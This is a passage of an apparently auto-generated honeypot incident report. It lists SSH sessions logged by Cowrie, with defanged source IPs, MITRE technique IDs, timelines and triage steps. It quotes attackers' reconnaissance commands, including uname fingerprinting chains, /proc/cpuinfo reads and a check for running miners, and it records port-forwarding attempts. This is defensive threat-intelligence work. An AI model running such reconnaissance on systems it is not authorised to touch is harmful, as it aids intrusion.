| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:53:18` | `cowrie.session.connect` |
| `2026-07-24 05:53:18` | `cowrie.client.version` |
| `2026-07-24 05:53:18` | `cowrie.client.kex` |
| `2026-07-24 05:53:19` | `cowrie.login.success` |
| `2026-07-24 05:53:19` | `cowrie.session.params` |
| `2026-07-24 05:53:19` | `cowrie.command.input` |
| `2026-07-24 05:53:19` | `cowrie.log.closed` |
| `2026-07-24 05:53:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c1ee32cb22d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 05:54 |
| **Last Seen** | 2026-07-24 05:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:54:22` | `cowrie.session.connect` |
| `2026-07-24 05:54:23` | `cowrie.client.version` |
| `2026-07-24 05:54:23` | `cowrie.client.kex` |
| `2026-07-24 05:54:27` | `cowrie.login.success` |
| `2026-07-24 05:54:29` | `cowrie.session.params` |
| `2026-07-24 05:54:29` | `cowrie.command.input` |
| `2026-07-24 05:54:29` | `cowrie.command.input` |
| `2026-07-24 05:54:29` | `cowrie.command.input` |
| `2026-07-24 05:54:29` | `cowrie.command.input` |
| `2026-07-24 05:54:29` | `cowrie.command.input` |
| `2026-07-24 05:54:29` | `cowrie.command.success` |
| `2026-07-24 05:54:29` | `cowrie.command.input` |
| `2026-07-24 05:54:29` | `cowrie.command.input` |
| `2026-07-24 05:54:29` | `cowrie.command.input` |
| `2026-07-24 05:54:29` | `cowrie.command.input` |
| `2026-07-24 05:54:30` | `cowrie.log.closed` |
| `2026-07-24 05:54:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7ee2561a56d

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:55 |
| **Last Seen** | 2026-07-24 05:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:55:04` | `cowrie.session.connect` |
| `2026-07-24 05:55:04` | `cowrie.client.version` |
| `2026-07-24 05:55:04` | `cowrie.client.kex` |
| `2026-07-24 05:55:04` | `cowrie.login.success` |
| `2026-07-24 05:55:05` | `cowrie.session.params` |
| `2026-07-24 05:55:05` | `cowrie.command.input` |
| `2026-07-24 05:55:05` | `cowrie.log.closed` |
| `2026-07-24 05:55:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f21eab05df06

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 05:56 |
| **Last Seen** | 2026-07-24 05:56 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:56:29` | `cowrie.session.connect` |
| `2026-07-24 05:56:29` | `cowrie.client.version` |
| `2026-07-24 05:56:29` | `cowrie.client.kex` |
| `2026-07-24 05:56:34` | `cowrie.login.success` |
| `2026-07-24 05:56:37` | `cowrie.session.params` |
| `2026-07-24 05:56:37` | `cowrie.command.input` |
| `2026-07-24 05:56:37` | `cowrie.command.input` |
| `2026-07-24 05:56:37` | `cowrie.command.input` |
| `2026-07-24 05:56:37` | `cowrie.command.input` |
| `2026-07-24 05:56:37` | `cowrie.command.input` |
| `2026-07-24 05:56:37` | `cowrie.command.success` |
| `2026-07-24 05:56:37` | `cowrie.command.input` |
| `2026-07-24 05:56:37` | `cowrie.command.input` |
| `2026-07-24 05:56:37` | `cowrie.command.input` |
| `2026-07-24 05:56:37` | `cowrie.command.input` |
| `2026-07-24 05:56:38` | `cowrie.log.closed` |
| `2026-07-24 05:56:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d1342f67d1f

| Field | Detail |
|---|---|
| **Source IP** | `211.253.10[.]61` |
| **First Seen** | 2026-07-24 05:56 |
| **Last Seen** | 2026-07-24 05:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:56:29` | `cowrie.session.connect` |
| `2026-07-24 05:56:30` | `cowrie.client.version` |
| `2026-07-24 05:56:30` | `cowrie.client.kex` |
| `2026-07-24 05:56:32` | `cowrie.login.success` |
| `2026-07-24 05:56:33` | `cowrie.direct-tcpip.request` |
| `2026-07-24 05:56:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.253.10[.]61` to AbuseIPDB if not already reported
- [ ] Block `211.253.10[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a727fb7ffd20

| Field | Detail |
|---|---|
| **Source IP** | `176.36.139[.]231` |
| **First Seen** | 2026-07-24 05:56 |
| **Last Seen** | 2026-07-24 05:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:56:42` | `cowrie.session.connect` |
| `2026-07-24 05:56:42` | `cowrie.client.version` |
| `2026-07-24 05:56:42` | `cowrie.client.kex` |
| `2026-07-24 05:56:43` | `cowrie.login.success` |
| `2026-07-24 05:56:43` | `cowrie.direct-tcpip.request` |
| `2026-07-24 05:56:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.36.139[.]231` to AbuseIPDB if not already reported
- [ ] Block `176.36.139[.]231` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e13bbc898e7

| Field | Detail |
|---|---|
| **Source IP** | `138.118.213[.]68` |
| **First Seen** | 2026-07-24 05:56 |
| **Last Seen** | 2026-07-24 05:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:56:43` | `cowrie.session.connect` |
| `2026-07-24 05:56:43` | `cowrie.client.version` |
| `2026-07-24 05:56:43` | `cowrie.client.kex` |
| `2026-07-24 05:56:45` | `cowrie.login.success` |
| `2026-07-24 05:56:46` | `cowrie.direct-tcpip.request` |
| `2026-07-24 05:56:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.118.213[.]68` to AbuseIPDB if not already reported
- [ ] Block `138.118.213[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-812db6dac74a

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:56 |
| **Last Seen** | 2026-07-24 05:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:56:53` | `cowrie.session.connect` |
| `2026-07-24 05:56:53` | `cowrie.client.version` |
| `2026-07-24 05:56:53` | `cowrie.client.kex` |
| `2026-07-24 05:56:53` | `cowrie.login.success` |
| `2026-07-24 05:56:54` | `cowrie.session.params` |
| `2026-07-24 05:56:54` | `cowrie.command.input` |
| `2026-07-24 05:56:54` | `cowrie.log.closed` |
| `2026-07-24 05:56:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47c13332f5ee

| Field | Detail |
|---|---|
| **Source IP** | `118.43.235[.]198` |
| **First Seen** | 2026-07-24 05:56 |
| **Last Seen** | 2026-07-24 05:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:56:53` | `cowrie.session.connect` |
| `2026-07-24 05:56:54` | `cowrie.client.version` |
| `2026-07-24 05:56:54` | `cowrie.client.kex` |
| `2026-07-24 05:56:56` | `cowrie.login.success` |
| `2026-07-24 05:56:57` | `cowrie.direct-tcpip.request` |
| `2026-07-24 05:57:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.43.235[.]198` to AbuseIPDB if not already reported
- [ ] Block `118.43.235[.]198` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-624c7fea864b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 05:58 |
| **Last Seen** | 2026-07-24 05:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:58:34` | `cowrie.session.connect` |
| `2026-07-24 05:58:34` | `cowrie.client.version` |
| `2026-07-24 05:58:34` | `cowrie.client.kex` |
| `2026-07-24 05:58:38` | `cowrie.login.success` |
| `2026-07-24 05:58:40` | `cowrie.session.params` |
| `2026-07-24 05:58:40` | `cowrie.command.input` |
| `2026-07-24 05:58:40` | `cowrie.command.input` |
| `2026-07-24 05:58:40` | `cowrie.command.input` |
| `2026-07-24 05:58:40` | `cowrie.command.input` |
| `2026-07-24 05:58:40` | `cowrie.command.input` |
| `2026-07-24 05:58:40` | `cowrie.command.success` |
| `2026-07-24 05:58:40` | `cowrie.command.input` |
| `2026-07-24 05:58:40` | `cowrie.command.input` |
| `2026-07-24 05:58:40` | `cowrie.command.input` |
| `2026-07-24 05:58:40` | `cowrie.command.input` |
| `2026-07-24 05:58:41` | `cowrie.log.closed` |
| `2026-07-24 05:58:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19bd88f040b7

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 05:58 |
| **Last Seen** | 2026-07-24 05:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:58:40` | `cowrie.session.connect` |
| `2026-07-24 05:58:40` | `cowrie.client.version` |
| `2026-07-24 05:58:40` | `cowrie.client.kex` |
| `2026-07-24 05:58:40` | `cowrie.login.success` |
| `2026-07-24 05:58:41` | `cowrie.session.params` |
| `2026-07-24 05:58:41` | `cowrie.command.input` |
| `2026-07-24 05:58:41` | `cowrie.log.closed` |
| `2026-07-24 05:58:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3817b81f4c07

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-24 05:58 |
| **Last Seen** | 2026-07-24 05:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:58:55` | `cowrie.session.connect` |
| `2026-07-24 05:58:55` | `cowrie.client.version` |
| `2026-07-24 05:58:55` | `cowrie.client.kex` |
| `2026-07-24 05:58:55` | `cowrie.login.success` |
| `2026-07-24 05:58:55` | `cowrie.direct-tcpip.request` |
| `2026-07-24 05:58:55` | `cowrie.direct-tcpip.data` |
| `2026-07-24 05:58:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c53f601b0084

| Field | Detail |
|---|---|
| **Source IP** | `223.197.153[.]135` |
| **First Seen** | 2026-07-24 05:59 |
| **Last Seen** | 2026-07-24 05:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:59:50` | `cowrie.session.connect` |
| `2026-07-24 05:59:51` | `cowrie.client.version` |
| `2026-07-24 05:59:51` | `cowrie.client.kex` |
| `2026-07-24 05:59:52` | `cowrie.login.success` |
| `2026-07-24 05:59:53` | `cowrie.direct-tcpip.request` |
| `2026-07-24 05:59:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.197.153[.]135` to AbuseIPDB if not already reported
- [ ] Block `223.197.153[.]135` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdfa77a0320f

| Field | Detail |
|---|---|
| **Source IP** | `87.225.108[.]138` |
| **First Seen** | 2026-07-24 05:59 |
| **Last Seen** | 2026-07-24 06:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 05:59:59` | `cowrie.session.connect` |
| `2026-07-24 05:59:59` | `cowrie.client.version` |
| `2026-07-24 05:59:59` | `cowrie.client.kex` |
| `2026-07-24 06:00:00` | `cowrie.login.success` |
| `2026-07-24 06:00:01` | `cowrie.direct-tcpip.request` |
| `2026-07-24 06:00:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.225.108[.]138` to AbuseIPDB if not already reported
- [ ] Block `87.225.108[.]138` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2231b0e6cb9

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:00 |
| **Last Seen** | 2026-07-24 06:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:00:25` | `cowrie.session.connect` |
| `2026-07-24 06:00:25` | `cowrie.client.version` |
| `2026-07-24 06:00:25` | `cowrie.client.kex` |
| `2026-07-24 06:00:26` | `cowrie.login.success` |
| `2026-07-24 06:00:27` | `cowrie.session.params` |
| `2026-07-24 06:00:27` | `cowrie.command.input` |
| `2026-07-24 06:00:27` | `cowrie.log.closed` |
| `2026-07-24 06:00:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0acbaa6069e2

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 06:00 |
| **Last Seen** | 2026-07-24 06:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:00:41` | `cowrie.session.connect` |
| `2026-07-24 06:00:41` | `cowrie.client.version` |
| `2026-07-24 06:00:41` | `cowrie.client.kex` |
| `2026-07-24 06:00:46` | `cowrie.login.success` |
| `2026-07-24 06:00:48` | `cowrie.session.params` |
| `2026-07-24 06:00:48` | `cowrie.command.input` |
| `2026-07-24 06:00:48` | `cowrie.command.input` |
| `2026-07-24 06:00:48` | `cowrie.command.input` |
| `2026-07-24 06:00:48` | `cowrie.command.input` |
| `2026-07-24 06:00:48` | `cowrie.command.input` |
| `2026-07-24 06:00:48` | `cowrie.command.success` |
| `2026-07-24 06:00:48` | `cowrie.command.input` |
| `2026-07-24 06:00:48` | `cowrie.command.input` |
| `2026-07-24 06:00:48` | `cowrie.command.input` |
| `2026-07-24 06:00:48` | `cowrie.command.input` |
| `2026-07-24 06:00:49` | `cowrie.log.closed` |
| `2026-07-24 06:00:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82a8e0ea2506

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 06:02 |
| **Last Seen** | 2026-07-24 06:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:02:15` | `cowrie.session.connect` |
| `2026-07-24 06:02:15` | `cowrie.client.version` |
| `2026-07-24 06:02:15` | `cowrie.client.kex` |
| `2026-07-24 06:02:16` | `cowrie.login.success` |
| `2026-07-24 06:02:16` | `cowrie.session.params` |
| `2026-07-24 06:02:16` | `cowrie.command.input` |
| `2026-07-24 06:02:17` | `cowrie.log.closed` |
| `2026-07-24 06:02:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfa3d1803fba

| Field | Detail |
|---|---|
| **Source IP** | `85.30.212[.]24` |
| **First Seen** | 2026-07-24 06:02 |
| **Last Seen** | 2026-07-24 06:05 |
| **Session Duration** | 191s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:02:39` | `cowrie.session.connect` |
| `2026-07-24 06:02:39` | `cowrie.client.version` |
| `2026-07-24 06:02:40` | `cowrie.client.kex` |
| `2026-07-24 06:02:48` | `cowrie.login.failed` |
| `2026-07-24 06:02:51` | `cowrie.login.success` |
| `2026-07-24 06:02:54` | `cowrie.session.params` |
| `2026-07-24 06:02:54` | `cowrie.command.input` |
| `2026-07-24 06:02:54` | `cowrie.command.failed` |
| `2026-07-24 06:02:56` | `cowrie.log.closed` |
| `2026-07-24 06:02:59` | `cowrie.session.params` |
| `2026-07-24 06:02:59` | `cowrie.command.input` |
| `2026-07-24 06:03:01` | `cowrie.log.closed` |
| `2026-07-24 06:03:03` | `cowrie.session.params` |
| `2026-07-24 06:03:03` | `cowrie.command.input` |
| `2026-07-24 06:03:05` | `cowrie.log.closed` |
| `2026-07-24 06:03:07` | `cowrie.session.params` |
| `2026-07-24 06:03:07` | `cowrie.command.input` |
| `2026-07-24 06:03:08` | `cowrie.log.closed` |
| `2026-07-24 06:03:11` | `cowrie.session.params` |
| `2026-07-24 06:03:11` | `cowrie.command.input` |
| `2026-07-24 06:03:12` | `cowrie.log.closed` |
| `2026-07-24 06:03:15` | `cowrie.session.params` |
| `2026-07-24 06:03:15` | `cowrie.command.input` |
| `2026-07-24 06:03:16` | `cowrie.log.closed` |
| `2026-07-24 06:03:18` | `cowrie.session.params` |
| `2026-07-24 06:03:18` | `cowrie.command.input` |
| `2026-07-24 06:03:19` | `cowrie.log.closed` |
| `2026-07-24 06:03:21` | `cowrie.session.params` |
| `2026-07-24 06:03:21` | `cowrie.command.input` |
| `2026-07-24 06:03:23` | `cowrie.log.closed` |
| `2026-07-24 06:03:26` | `cowrie.session.params` |
| `2026-07-24 06:03:26` | `cowrie.command.input` |
| `2026-07-24 06:03:27` | `cowrie.log.closed` |
| `2026-07-24 06:05:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.30.212[.]24` to AbuseIPDB if not already reported
- [ ] Block `85.30.212[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69b0ba034c2b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-07-24 06:02 |
| **Last Seen** | 2026-07-24 06:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 06:02:44` | `cowrie.session.connect` |
| `2026-07-24 06:02:44` | `cowrie.client.version` |
| `2026-07-24 06:02:44` | `cowrie.client.kex` |
| `2026-07-24 06:02:48` | `cowrie.login.success` |
| `2026-07-24 06:02:51` | `cowrie.session.params` |
| `2026-07-24 06:02:51` | `cowrie.command.input` |
| `2026-07-24 06:02:51` | `cowrie.command.input` |
| `2026-07-24 06:02:51` | `cowrie.command.input` |
| `2026-07-24 06:02:51` | `cowrie.command.input` |
| `2026-07-24 06:02:51` | `cowrie.command.input` |
| `2026-07-24 06:02:51` | `cowrie.command.success` |
| `2026-07-24 06:02:51` | `cowrie.command.input` |
| `2026-07-24 06:02:51` | `cowrie.command.input` |
| `2026-07-24 06:02:51` | `cowrie.command.input` |
| `2026-07-24 06:02:51` | `cowrie.command.input` |
| `2026-07-24 06:02:52` | `cowrie.log.closed` |
| `2026-07-24 06:02:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
